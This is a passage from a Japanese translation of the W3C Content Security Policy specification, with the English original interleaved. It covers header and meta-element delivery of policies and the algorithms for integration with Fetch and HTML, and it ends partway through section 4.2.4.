~serverは、個々の`資源~表現$に対し，`施策$を宣言して~MAY
— `施策$を`直列化-$した上で，~HTTP応答~headerの値に与えることにより。
この仕組みは、［
<a href="#csp-header">`Content-Security-Policy^h</a> ／
<a href="#cspro-header">`Content-Security-Policy-Report-Only^h</a>
］HTTP 応答~header節にて詳細に定義される。
また、［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にて［
~Fetch ／ ~HTML
］との統合が述べられる。
◎
A server MAY declare a policy for a particular resource representation via an HTTP response header field whose value is a serialized CSP. This mechanism is defined in detail in §3.1 The Content-Security-Policy HTTP Response Header Field and §3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field, and the integration with Fetch and HTML is described in §4.1 Integration with Fetch and §4.2 Integration with HTML.
</p>

<p>
`施策$は、
<a href="#meta-element">`meta^e 要素</a>
節に述べるように，［
`meta$e 要素の `http-equiv$a 属性を介して ~HTML文書~内に~inlineに宣言する
］こともできる。
◎
A policy may also be declared inline in an HTML document via a meta element’s http-equiv attribute, as described in §3.3 The &lt;meta&gt; element.
</p>


		<section id="csp-header">
<h3 title="The Content-Security-Policy HTTP Response Header Field">3.1. `Content-Security-Policy^h HTTP 応答~header</h3>

<p>
`Content-Security-Policy@h
~HTTP応答~headerが、~serverから~clientへ施策を送達するときに選好される仕組みである。
この~headerの値は、次の`~ABNF$で表現される：
◎
The Content-Security-Policy HTTP response header field is the preferred mechanism for delivering a policy from a server to a client. The header’s value is represented by the following ABNF [RFC5234]:
</p>


<pre class="ABNF">
Content-Security-Policy = 1#`serialized-policy$p
</pre>

<div class="example">

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir `self$pl;
    `report-to$dir csp-reporting-endpoint
</pre>
</div>

<p>
~serverは、同じ資源の異なる`表現$ごとに，異なる
`Content-Security-Policy^h ~header値を送信して~MAY。
◎
A server MAY send different Content-Security-Policy header field values with different representations of the same resource.
</p>

<p>
~serverは、`資源~表現$を送信する際に，複数の
`Content-Security-Policy^h ~headerを伴わせる~SHOULDでない。
◎
A server SHOULD NOT send more than one HTTP response header field named "Content-Security-Policy" with a given resource representation.
</p>

<p>
`Content-Security-Policy^h ~headerを受信した~UAは、それが包含する各 `直列形の~CSP$を`構文解析-$した上で，［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にしたがって それを`施行-$し~MUST。
◎
When the user agent receives a Content-Security-Policy header field, it MUST parse and enforce each serialized CSP it contains as described in §4.1 Integration with Fetch, §4.2 Integration with HTML.
</p>



		</section>
		<section id="cspro-header">
<h3 title="The Content-Security-Policy-Report-Only HTTP Response Header Field">3.2. `Content-Security-Policy-Report-Only^h HTTP 応答~header</h3>

<p>
`Content-Security-Policy-Report-Only@h
~HTTP応答~headerは、~web開発者が，施策による効果を（~~実際に施行することなく）監視して，実験できるようにする。
この~headerの値は、次の`~ABNF$ で表現される：
◎
The Content-Security-Policy-Report-Only HTTP response header field allows web developers to experiment with policies by monitoring (but not enforcing) their effects. The header’s value is represented by the following ABNF [RFC5234]:
</p>

<pre class="ABNF">
Content-Security-Policy-Report-Only = 1#`serialized-policy$p
</pre>

<p>
この~headerにより、~web開発者は，自身の手による保安~施策を，すでに施行-中のものと同時に，報告のみ行わせて、反復的に開発することが可能になる
— その違反~報告から得られる，~siteの挙動についての最善の見積もりに基づいて、挙動が適切であると判断がついた時点で，施策を施行-へ移すことにより。
◎
This header field allows developers to piece together their security policy in an iterative fashion, deploying a report-only policy based on their best estimate of how their site behaves, watching for violation reports, and then moving to an enforced policy once they’ve gained confidence in that behavior.
</p>

<div class="example">

<pre class="http-code">
`Content-Security-Policy-Report-Only$h:
    `script-src$dir `self$pl;
    `report-to$dir csp-reporting-endpoint
</pre>
</div>

<p>
~serverは、同じ資源の異なる`表現$ごとに，異なる
`Content-Security-Policy-Report-Only^h ~header値を送信して~MAY。
◎
A server MAY send different Content-Security-Policy-Report-Only header field values with different representations of the same resource.
</p>

<p>
~serverは、`資源~表現$を送信する際に，複数の［
`Content-Security-Policy-Report-Only^h ~header
］を伴わせる~SHOULDでない。
◎
A server SHOULD NOT send more than one HTTP response header field named "Content-Security-Policy-Report-Only" with a given resource representation.
</p>

<p>
`Content-Security-Policy-Report-Only^h ~headerを受信した~UAは、それが包含する各 `直列形の~CSP$を`構文解析-$した上で，［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にしたがって，それを`監視-$し~MUST。
◎
When the user agent receives a Content-Security-Policy-Report-Only header field, it MUST parse and monitor each serialized CSP it contains as described in §4.1 Integration with Fetch and §4.2 Integration with HTML.
</p>

<p class="note">注記：
`Content-Security-Policy-Report-Only^h 
~headerは、
`meta$e 要素の内側では~support<strong>されない</strong>。
◎
Note: The Content-Security-Policy-Report-Only header is not supported inside a meta element.
</p>



		</section>
		<section id="meta-element">
<h3 title="The &lt;meta&gt; element">3.3. `meta^e 要素</h3>

<p>
`文書$は、いくつかの［
~HTML `meta$e 要素であって, ［
その `http-equiv$a 属性~値 ~EQ`~ACI$ `Content-Security-Policy^l
］なるもの
］を介して，施策を送達することもできる<!-- may -->。
例えば：
◎
A Document may deliver a policy via one or more HTML meta elements whose http-equiv attributes are an ASCII case-insensitive match for the string "Content-Security-Policy". For example:
</p>

<div class="example">

<pre class="html-code">
&lt;meta
  http-equiv="Content-Security-Policy"
  content="script-src `self$pl"
&gt;
</pre>
</div>

<p>
実装の詳細は~HTMLの
`~CSP状態 http-equiv 処理命令$ `HTML$r
にて見出せる。
◎
Implementation details can be found in HTML’s Content Security Policy state http-equiv processing instructions [HTML].
</p>

<p class="note">注記：
`Content-Security-Policy-Report-Only^h ~headerは、
`meta$e 要素の内側では~support<strong>されない</strong>
— ［
`report-uri$dir,
`frame-ancestors^dir,
`sandbox^dir
］指令も含め。
◎
Note: The Content-Security-Policy-Report-Only header is not supported inside a meta element. Neither are the report-uri, frame-ancestors, and sandbox directives.
</p>

<p>
`meta$e 要素~内の施策は、それに先行する内容には適用されない。
したがって，作者には、［
`meta$e 要素を 可能な限り文書の始めの方に配置する
］ことが<em>強く奨励される</em>。
特に、［
`Link$h HTTP 応答~header ／
施策を送達する `meta$e に先行する［
`link$e ／ `script$e
］要素
］を利用して，~fetchあるいは~prefetchされる資源は、阻止されないことに注意。
◎
Authors are strongly encouraged to place meta elements as early in the document as possible, because policies in meta elements are not applied to content which precedes them. In particular, note that resources fetched or prefetched using the Link HTTP response header field, and resources fetched or prefetched using link and script elements which precede a meta-delivered policy will not be blocked.
</p>

<p class="note">注記：
`meta$e 要素を介して指定される`施策$は、被保護~資源にて作動中の他の施策とともに
— 他の施策がどこで指定されたかに関わらず —
施行される。
複数の施策が施行されるときの一般的な影響0は、
<a href="#multiple-policies">複数の施策による効果</a>
節にて述べる。
◎
Note: A policy specified via a meta element will be enforced along with any other policies active for the protected resource, regardless of where they’re specified. The general impact of enforcing multiple policies is described in §8.1 The effect of multiple policies.
</p>

<p class="note">注記：
要素が構文解析された後に，
`meta$e 要素の `content$a 属性を改変しても、無視される。
◎
Note: Modifications to the content attribute of a meta element after the element has been parsed will be ignored.
</p>

		</section>
	</section>
	<section id="integrations">
<h2 title="Integrations">4. 他の仕様との統合</h2>

~INFORMATIVE

<p>
この文書は、~CSPの機能性を実装するために，他の仕様から利用される~algoの集合を定義する。
明確さのため、これらの統合は，ここで概説されるが、詳細な情報への規範的な参照は，それらの外部~文書にあたるべきである。
◎
This document defines a set of algorithms which are used in other specifications in order to implement the functionality. These integrations are outlined here for clarity, but those external documents are the normative references which ought to be consulted for detailed information.
</p>



		<section id="fetch-integration">
<h3 title="Integration with Fetch">4.1. ~Fetchとの統合</h3>

<p>
`指令$のうち一部は、何らかの仕方で，資源の読込みを制御する。
この仕様は、 `FETCH$r にて［
特定0の`要請$を阻止するべきか許容するべきか ／
特定0の`応答$を`~network~error$に置換するべきかどうか
］について裁定を下すときに利用される，いくつかの~algoを供する。
◎
A number of directives control resource loading in one way or another. This specification provides algorithms which allow Fetch to make decisions about whether or not a particular request should be blocked or allowed, and about whether a particular response should be replaced with a network error.
</p>

<ul>
	<li>
`要請は~CSPにより阻止されるべきか？$Aは、`~main~fetch$~algoの中<!-- step #5 -->から~callされる。
これにより、各 `要請$に対し，［
それが~networkを叩く前, および
それが資源に達するまでに生じ得る各~redirectに対し
］，指令の`要請前~検査$Aを実行できるようになる。
◎
§4.1.3 Should request be blocked by Content Security Policy? is called as part of step #5 of its Main Fetch algorithm. This allows directives' pre-request checks to be executed against each request before it hits the network, and against each redirect that a request might go through on its way to reaching a resource.
</li>
	<li>
`要請に対する応答は~CSPにより阻止されるべきか？$Aは、`~main~fetch$~algoの中<!-- step #13 -->から~callされる。
これにより、~networkまたは Service Worker から送達された`応答$に対し，指令の［
`要請後~検査$A／`応答~検査$A
］を実行できるようになる。
◎
§4.1.4 Should response to request be blocked by Content Security Policy? is called as part of step #13 of its Main Fetch algorithm. This allows directives' post-request checks and response checks to be executed on the response delivered from the network or from a Service Worker.
</li>
</ul>

<p>
`施策$は，一般に `大域~obj$に対し施行されるが、［
`応答$の詳細~についての知識も要求する指令
］を取扱うため、~UAは，［
~HTTP応答~headerを介して送達される どの施策も，`大域~obj$が作成される前に`構文解析-$する
］必要がある。
よって：
◎
A policy is generally enforced upon a global object, but the user agent needs to parse any policy delivered via an HTTP response header field before any global object is created in order to handle directives that require knowledge of a response’s details. To that end:
</p>

<ul>
	<li>
`応答$には、`~CSP~list$rsが結付けられる
— この~listは、`応答$の`~header~list$rs内に送達される施策~objたちを包含する。
◎
A response has an associated CSP list which contains any policy objects delivered in the response’s header list.
</li>
	<li>
<p>
`応答の~CSP~listを設定する$A手続きが，［
`~HTTP~fetch$ ／ `~HTTP-network~fetch$
］~algoの中から~callされる
◎
§4.1.1 Set response’s CSP list is called in the HTTP fetch and HTTP-network fetch algorithms.
</p>

<p class="note">注記：
`応答$がどう作成されたかに関わらず、これら 2 つの~callにより，`応答$の`~CSP~list$rsは必ず設定されるようにするべきである。
~networkを（ `~HTTP-network~fetch$を介して）叩いたのなら、応答に伴われる施策を， `Set-Cookie^h ~headerを取扱う前に構文解析することになる。
応答を（`~HTTP~fetch$を介して） Service Worker から取得したのなら、応答を呼び出し元に~~渡し~~返す前に，その`~CSP~list$rsを処理することになる。
◎
Note: These two calls should ensure that a response’s CSP list is set, regardless of how the response is created. If we hit the network (via HTTP-network fetch, then we parse the policy before we handle the Set-Cookie header. If we get a response from a Service Worker (via HTTP fetch, we’ll process its CSP list before handing the response back to our caller.
</p>
	</li>
</ul>



			<section id="set-response-csp-list">
<h4 title="Set response’s CSP list">4.1.1. %応答 の~CSP~listを設定する</h4>

<p>
次の~algoは、所与の
( `応答$ %応答 )
に対し，［
その`~header~list$rsを，一連の`直列形の~CSP$値として評価した結果
］に基づいて， %応答 の`~CSP~list$rsを拡充する：
◎
Given a response (response), this algorithm evaluates its header list for serialized CSP values, and populates its CSP list accordingly:
</p>


<ol>
	<li>
%~CSP~list ~LET 空~list
◎
Set response’s CSP list to the empty list.
</li>
	<li>
%~CSP~list に次の結果を成す各~itemを順に付加する
⇒
`直列形の~CSP~listを構文解析する$A( 次の結果, `header^l, `enforce^l )
⇒
`~header~listから値を抽出する$A( %応答 の`~header~list$rs, `Content-Security-Policy^h )
◎
Let policies be the result of parsing the result of extracting header list values given Content-Security-Policy and response’s header list, with a source of "header", and a disposition of "enforce".
</li>
	<li>
%~CSP~list に次の結果を成す各~itemを順に付加する
⇒
`直列形の~CSP~listを構文解析する$A( 次の結果, `header^l, `report^l )
⇒
`~header~listから値を抽出する$A( %応答 の`~header~list$rs, `Content-Security-Policy-Report-Only^h )
◎
Append to policies the result of parsing the result of extracting header list values given Content-Security-Policy-Report-Only and response’s header list, with a source of "header", and a disposition of "report".
</li>
	<li>
%応答 の`~CSP~list$rs ~SET %~CSP~list
◎
For each policy in policies:
• Insert policy into response’s CSP list.
</li>
</ol>

			</section>
			<section id="report-for-request">
<h4 title="Report Content Security Policy violations for request">4.1.2.  %要請 に対する~CSP違反を報告する</h4>

<p>
次の~algoは、所与の
( `要請$ %要請 )
に対し，
`~client$rqの “報告のみ” の施策に基づいて違反を報告する：
◎
Given a request (request), this algorithm reports violations based on client’s "report only" policies.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$enVの`~CSP~list$gO
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
<p>
%~CSP~list 内の
~EACH( %施策 )
に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
~CONTINUE
◎
If policy’s disposition is "enforce", then skip to the next policy.
</li>
			<li>
%違反ed指令 ~LET 
`要請は施策に違反するか？$A( %要請, %施策 )
◎
Let violates be the result of executing §6.6.1.1 Does request violate policy? on request and policy.
</li>
			<li>
~IF［
%違反ed指令 ~NEQ `非違反^i
］
⇒
`違反を報告する$A( `新たな違反~obj$A( %要請, %施策, %違反ed指令 ) )
◎
If violates is not "Does Not Violate", then execute §5.3 Report a violation on the result of executing §2.4.2 Create a violation object for request, policy, and directive on request, policy, and violates.
</li>
		</ol>
	</li>
</ol>


			</section>
			<section id="should-block-request">
<h4 title="Should request be blocked by Content Security Policy?">4.1.3. %要請 は~CSPにより阻止されるべきか？</h4>

<p>
次の~algoは、所与の
( `要請$ %要請 )
に対し，［
`阻止ed^i ／ `許容ed^i
］を返した上で、
%要請 の`~client$rqの~CSPに基づいて違反を報告する：
◎
Given a request (request), this algorithm returns Blocked or Allowed and reports violations based on request’s client’s Content Security Policy.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$enVの`~CSP~list$gO
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
%~CSP~list 内の
~EACH( %施策 )
に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
~IF［
%施策 の`処置先$ ~EQ `report^l
］
⇒
~CONTINUE
◎
If policy’s disposition is "report", then skip to the next policy.
</li>
			<li>
%違反ed指令 ~LET
`要請は施策に違反するか？$A( %要請, %施策 )
◎
Let violates be the result of executing §6.6.1.1 Does request violate policy? on request and policy.
</li>
			<li>
<p>
~IF［
%違反ed指令 ~NEQ `非違反^i
］：
◎
If violates is not "Does Not Violate", then:
</p>
				<ol>
					<li>
`違反を報告する$A( `新たな違反~obj$A( %要請, %施策, %違反ed指令 ) )
◎
Execute §5.3 Report a violation on the result of executing §2.4.2 Create a violation object for request, policy, and directive on request, policy, and violates.
</li>
					<li>
%結果 ~SET `阻止ed^i
◎
Set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>



			</section>
			<section id="should-block-response">
<h4 title="Should response to request be blocked by Content Security Policy?">4.1.4. %要請 に対する %応答 は~CSPにより阻止されるべきか？</h4>

<p>
次の~algoは、所与の
( `応答$ %応答, `要請$ %要請 )
に対し，［
`阻止ed^i ／ `許容ed^i
］を返した上で、
%要請 の
`~client$rqの~CSPに基づいて違反を報告する：
◎
Given a response (response) and a request (request), this algorithm returns Blocked or Allowed, and reports violations based on request’s client’s Content Security Policy.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$enVの`~CSP~list$gO
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
%~CSP~list 内の
~EACH( %施策 )
に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
<p>
~IF［
%指令 の`要請後~検査$Aを実行した結果 ~EQ `阻止ed^i
］：
◎
If the result of executing directive’s post-request check is "Blocked", then:
</p>
						<ol>
							<li>
`違反を報告する$A( `新たな違反~obj$A( %要請, %施策, %指令 ) )
◎
Execute §5.3 Report a violation on the result of executing §2.4.2 Create a violation object for request, policy, and directive on request, policy, and directive.
</li>
							<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l

］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>
<p class="note">注記：
検査のこの部位は、~pageが応答を読込めるかどうかを検証0する。
すなわち， Service Worker が、~pageの~CSPに違反するような~fileに~~置き換えていないかどうかを。
◎
Note: This portion of the check verifies that the page can load the response. That is, that a Service Worker hasn’t substituted a file which would violate the page’s CSP.
</p>
	</li>
	<li>
<p>
%応答 の`~CSP~list$rs内の
~EACH( %施策 )
に対し：
◎
For each policy in response’s CSP list:
</p>
		<ol>
			<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
<p>
~IF［
( %要請, %応答, %施策 )
に対し，%指令 の`応答~検査$Aを実行した結果 ~EQ `阻止ed^i
］：
◎
If the result of executing directive’s response check on request, response, and policy is "Blocked", then:
</p>
						<ol>
							<li>
`違反を報告する$A( `新たな違反~obj$A( %要請, %施策, %指令 ) )
◎
Execute §5.3 Report a violation on the result of executing §2.4.2 Create a violation object for request, policy, and directive on request, policy, and directive.
</li>
							<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
検査のこの部位は、応答に伴って送達されてきた施策が，応答の送達を許容するかどうかを決定できるようにする。
◎
Note: This portion of the check allows policies delivered with the response to determine whether the response is allowed to be delivered.
</p>

	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>

			</section>
		</section>
		<section id="html-integration">
<h3 title="Integration with HTML">4.2. ~HTMLとの統合</h3>

<ul>
	<li>
<p>
各［
`Document$I ／ `WorkerGlobalScope$I ／ `WorkletGlobalScope$I
］~objは、~CSP~listを持つ
—
それは、所与の文脈で作動中の`施策$~objすべてを保持する。
この~listは、指定されない限り空であり，
`大域~objの~CSP~listを初期化する$A
~algoを介して拡充される。
◎
The Document, WorkerGlobalScope, and WorkletGlobalScope objects have a CSP list, which holds all the policy objects which are active for a given context. This list is empty unless otherwise specified, and is populated via the §4.2.2 Initialize a global object’s CSP list algorithm.
</p>

<p class="issue">
この概念は、 W3C 版の Workers にはない（ `187^IssW3C ）。
◎
This concept is missing from W3C’s Workers. &lt;https://github.com/w3c/html/issues/187&gt;
</p>
	</li>
	<li>
`大域~obj$ %G の
`~CSP~list@gO
は、次の結果を返す
⇒
`~objの~CSP~listを得る$A( %G )
【定義が循環参照になっている。】<!-- ＊ -->
◎
A global object’s CSP list is the result of executing §4.2.3 Retrieve the CSP list of an object with the global object as the object.
</li>
	<li>
`施策$は、`大域~obj$の`~CSP~list$gO内に挿入されることにより，`大域~obj$に対し［
`施行-@
／
`監視-@
］されることになる。
◎
A policy is enforced or monitored for a global object by inserting it into the global object’s CSP list.
</li>
	<li>
`大域~objの~CSP~listを初期化する$A手続きは、［
`応答$に結付けられた`施策$~objの集合
］を［
新たに作成された［
`Document$I ／ `WorkerGlobalScope$I ／ `WorkletGlobalScope$I
］に束縛する
］ために，［
`新たな文書~objを初期化する$, あるいは
`~workerを走らす$
］~algoの中から~callされる。
◎
§4.2.2 Initialize a global object’s CSP list is called during the initializing a new Document object and run a worker algorithms in order to bind a set of policy objects associated with a response to a newly created Document, WorkerGlobalScope or WorkletGlobalScope.
</li>
	<li>
<p >
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
は、次の 2 つから~callされる：
</p>
		<ul>
			<li>
`~scriptを準備する$ときに，~inline~script~blockの実行が許容されるかどうかを決定するとき。
</li>
			<li>
`~style~blockを更新する$~algoの中で，~inline~style~blockによる具現化-が許容されるかどうかを決定するとき。
</li>
		</ul>
◎
§4.2.4 Should element’s inline type behavior be blocked by Content Security Policy? is called during the prepare a script and update a style block algorithms in order to determine whether or not an inline script or style block is allowed to execute/render.
</li>
	<li>
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$Aは、［
~inline~event~handler（ `onclick^c など）／
~inline `style^a 属性
］を取扱う間に，［
その［
実行- ／ 具現化-
］が許容されるべきかどうか
］を決定するために~callされる。
◎
§4.2.4 Should element’s inline type behavior be blocked by Content Security Policy? is called during handling of inline event handlers (like onclick) and inline style attributes in order to determine whether or not they ought to be allowed to execute/render.
</li>
	<li>
各 `施策$は、 `meta$e 要素の `http-equiv$a 属性を処理する間に`施行され$る。
◎
policy is enforced during processing of the meta element’s http-equiv.
</li>
	<li>
所与の`文書$ %C に対し，次を満たす`文書$ %D が存在するならば、
%D を指して %C を
`埋込んでいる文書@
という
⇒
%D が`属する閲覧文脈$は， %C が`属する閲覧文脈$を %D を`通して入子に$している
◎
A Document's embedding document is the Document through which the Document's browsing context is nested.
</li>
	<li>
<p>
HTML は、［
資源の読込みに責を負う要素
］からの関連する~dataで，各`要請$の［
`暗号用~nonce~metadata$rq,
`構文解析器~metadata$rq
］を拡充する。
◎
HTML populates each request’s cryptographic nonce metadata and parser metadata with relevant data from the elements responsible for resource loading.
</p>

<p class="issue">
~stylesheetの読込みは、まだ
W3C 版~HTMLにおける~Fetchには統合されていない（
<a href="~HTMLissue/198">&lt;~HTMLissue/198&gt;</a>
）
◎
Stylesheet loading is not yet integrated with Fetch in W3C’s HTML. &lt;https://github.com/whatwg/html/issues/198&gt;
</p>

<p class="issue">
~stylesheetの読込みは、まだ
WHATWG 版~HTMLにおける~Fetchには統合されていない（
<a href="~HTMLissue/968">&lt;~HTMLissue/968&gt;</a>
）
◎
Stylesheet loading is not yet integrated with Fetch in WHATWG’s HTML. &lt;https://github.com/whatwg/html/issues/968&gt;
</p>
	</li>
	<li>
<a href="#allow-base-for-document">%文書 に対する %基底 は許容されるか？</a> は、
`href$a 属性の値が妥当になることを確保するため，
`base$e の`凍結~基底~URLを設定する$間に~callされる
◎
§6.2.1.1 Is base allowed for document? is called during base's set the frozen base URL algorithm to ensure that the href attribute’s value is valid.
</li>
	<li>
<p>
<a href="#should-plugin-element-be-blocked-a-priori-by-content-security-policy">%~plugin要素 は~CSPにより先天的に阻止されるべきか？</a>
は、
`object$e ／ `embed$e ／ `applet$e
要素の処理に際し，それが ~fetchを誘発してよいかどうかを決定する間に~callされる
◎
§6.2.2.2 Should plugin element be blocked a priori by Content Security Policy?: is called during the processing of object, embed, and applet elements to determine whether they may trigger a fetch.
</p>

<p class="note">注記：
~fetchされた~plugin資源は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
にて取扱われる。
◎
Note: Fetched plugin resources are handled in §4.1.4 Should response to request be blocked by Content Security Policy?.
</p>

<p class="issue">
この~hookは W3C 版~HTMLにはまだない。
`547^IssW3C
◎
This hook is missing from W3C’s HTML. &lt;https://github.com/w3c/html/issues/547&gt;
</p>
	</li>
	<li>
<p>
`~sourceから~targetを~navigateするある種別の要請は~CSPにより阻止されるべきか？$Aは、`~navigate~fetchを処理する$A間に~callされる。
`~sourceから~targetを~navigateするある種別の要請に対する応答は~CSPにより阻止されるべきか？$Aは、`~navigate応答を処理する$A間に~callされる。
いずれも，指令の~navi検査を適用する。
後者は `javascript_^sc ~URLへの~naviに対する~inline検査を適用する。
◎
§4.2.5 Should navigation request of type from source in target be blocked by Content Security Policy? is called during the process a navigate fetch algorithm, and §4.2.6 Should navigation response to navigation request of type from source in target be blocked by Content Security Policy? is called during the process a navigate response algorithm to apply directive’s navigation checks, as well as inline checks for navigations to javascript: URLs.
</p>

<p class="issue">
W3C 版~HTMLは ~Fetchに基づいておらず，`~navigate応答を処理する$A~algoを~hookする場がない。
`548^IssW3C
◎
W3C’s HTML is not based on Fetch, and does not have a process a navigate response algorithm into which to hook. &lt;https://github.com/w3c/html/issues/548&gt;
</p>
	</li>
</ul>



			<section id="initialize-document-csp">
<h4 title="Initialize a Document's CSP list">4.2.1. 文書の~CSP~listを初期化する</h4>

<p>
この手続きは、所与の
( `文書$ %文書, `応答$ %応答 )
に対し，
%文書 の`~CSP~list$docを初期化する：
◎
Given a Document (document), and a response (response), the user agent performs the following steps in order to initialize document’s CSP list:
</p>

<ol>
	<li>
<p>
~IF［
%応答 の`~url$rsの`~scheme$urlは `局所~scheme$である
］：
◎
If response’s url’s scheme is a local scheme:
</p>
		<ol>
			<li>
%文書たち ~LET 空~list
◎
Let documents be an empty list.
</li>
			<li>
~IF［
%文書 を`埋込んでいる文書$ %D はある
］
⇒
%D を %文書たち に追加する
◎
If document has an embedding document (embedding), then add embedding to documents.
</li>
			<li>
~IF［
%文書 を`開いた閲覧文脈$ %B はある
］
⇒
%B にて`作動中の文書$を %文書たち に追加する
◎
If document has an opener browsing context, then add its active document to documents.
</li>
			<li>
%文書たち 内の
~EACH( %D )
に対し
⇒
%D の`~CSP~list$doc内の
~EACH( %施策 )
に対し
⇒
%文書 の`~CSP~list$docの中に %施策 の複製を挿入する
◎
For each doc in documents:
• For each policy in doc’s CSP list:
••Insert a copy of policy into document’s CSP list.
</li>
		</ol>

<p class="note">注記：
`局所~scheme$には `about_^sc も含まれるので、この~algoは，
`~iframe-srcdoc文書$を`埋込んでいる文書$の施策を複製する。
◎
Note: local scheme includes about:, and this algorithm will therefore copy the embedding document’s policies for an iframe srcdoc Document.
</p>

<p class="note">注記：
この段は、次を確保するためにある
⇒
［
~frameを埋込む ／ 新たな~windowを~pop-upする
］ことにより，~pageが制御する内容（ `blob_^sc 資源, `document.write()^c など）が~pageの`施策$を迂回することは、できない。
◎
Note: We do all this to ensure that a page cannot bypass its policy by embedding a frame or popping up a new window containing content it controls (blob: resources, or document.write()).
</p>
	</li>
	<li>
%応答 の`~CSP~list$rs内の
~EACH( %施策 )
に対し
⇒
%文書 の`~CSP~list$docの中に %施策 を挿入する
◎
For each policy in response’s CSP list, insert policy into document’s CSP list.
</li>
	<li>
%文書 の`~CSP~list$doc内の
~EACH( %施策 )
に対し
⇒
%施策 内の
~EACH( %指令 )
に対し
⇒
( %文書, %応答 )
を与える下で，
%指令 の`初期化$A~algoを実行する
◎
For each policy in document’s CSP list:
• For each directive in policy:
•• Execute directive’s initialization algorithm on document and response.
</li>
</ol>

			</section>
			<section id="initialize-global-object-csp">
<h4 title="Initialize a global object’s CSP list">4.2.2. 大域~objの~CSP~listを初期化する</h4>

<p>
この手続きは、所与の
( `大域~obj$ %大域~obj, `応答$ %応答 )
に対し，
%大域~obj の`~CSP~list$gOを初期化する：
◎
Given a global object (global), and a response (response), the user agent performs the following steps in order to initialize global’s CSP list:
</p>

<ol>
	<li>
<p>
~IF［
%応答 の`~url$rsの`~scheme$urlは `局所~scheme$である
］~OR［
%大域~obj は `DedicatedWorkerGlobalScope$I である
］：
◎
If response’s url’s scheme is a local scheme, or if global is a DedicatedWorkerGlobalScope:
</p>
		<ol>
			<li>
%大域~obj の`所有者~集合$ 内の
~EACH( %所有者 )
に対し
⇒
%所有者 の`~CSP~list$gO内の
~EACH( %施策 )
に対し
⇒
%大域~obj の`~CSP~list$gOの中に %施策 の複製を挿入する
◎
Let owners be an empty list.
◎
Add each of the items in global’s owner set to owners.
◎
For each owner in owners:
• For each policy in owner’s CSP list:
•• Insert a copy of policy into global’s CSP list.
</li>
		</ol>

<p class="note">注記：
`局所~scheme$には `about_^sc も含まれる
— したがってこの~algoは、`~iframe-srcdoc文書$を`埋込んでいる文書$の施策を複製する。
◎
Note: local scheme includes about:, and this algorithm will therefore copy the embedding document’s policies for an iframe srcdoc Document.
</p>
	</li>
	<li>
~IF［
%大域~obj は［
`SharedWorkerGlobalScope$I ／ `ServiceWorkerGlobalScope$I 
］である
］
⇒
%応答 の`~CSP~list$rs内の
~EACH( %施策 )
に対し
⇒
%大域~obj の`~CSP~list$gOの中に %施策 を挿入する
◎
If global is a SharedWorkerGlobalScope or ServiceWorkerGlobalScope:
• For each policy in response’s CSP list, insert policy into global’s CSP list.
</li>
	<li>
~IF［
%大域~obj は `WorkletGlobalScope$I である
］
⇒
%大域~obj の`所有者~文書$の`~CSP~list$gO内の
~EACH( %施策 )
に対し
⇒
%大域~obj の`~CSP~list$gOの中に %施策 の複製を挿入する
◎
If global is a WorkletGlobalScope:
• Let owner be global’s owner document.
• For each policy in owner’s CSP list:
•• Insert a copy of policy into global’s CSP list.
</li>
</ol>


			</section>
			<section id="get-csp-of-object">
<h4 title="Retrieve the CSP list of an object">4.2.3. %~obj の~CSP~listを得る</h4>

<p>
%~obj の`~CSP~list$gOを得るときは %~obj に応じて，次を返す
⇒＃
`文書$であるならば %~obj の`~CSP~list$doc ／
`Window$I であるならば %~obj に`結付けられている文書$の`~CSP~list$doc ／
`WorkerGlobalScope$I であるならば %~obj の`~CSP~list$gO ／
`WorkletGlobalScope$I であるならば %~obj の`~CSP~list$gO ／
~ELSE_ ~NULL
◎
To obtain object’s CSP list:
• If object is a Document return object’s CSP list.
• If object is a Window return object’s associated Document’s CSP list.
• If object is a WorkerGlobalScope, return object’s CSP list.
• If object is a WorkletGlobalScope, return object’s CSP list.
• Return null.
</p>

			</section>
			<section id="should-block-inline">
<h4 title="Should element’s inline type behavior be blocked by Content Security Policy?">4.2.4. %要素 における~inline型の挙動は~CSPにより阻止されるべきか？</h4>

<p>
この~algoは、所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し，
%要素 における［
~inline定義による特定0の型の挙動（
~script実行, ~styleの適用, ~event~handler,
等々）
］が［
許容されるならば `許容ed^i ／
許容されないならば `阻止ed^i
］を返す：
◎
